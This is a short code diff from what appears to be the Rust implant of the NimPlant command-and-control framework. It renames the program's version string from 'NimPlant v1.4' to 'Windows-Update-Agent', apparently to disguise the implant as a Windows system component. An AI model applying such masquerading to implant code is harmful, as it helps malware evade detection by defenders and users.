@@ -24,7 +24,7 @@ use crate::app::config::Config;
 use crate::app::debug::debug_println;
 use rand::Rng;
 
-pub const VERSION: &str = "NimPlant v1.4";
+pub const VERSION: &str = "Windows-Update-Agent";
 
 pub fn main() {
     // Print the version header
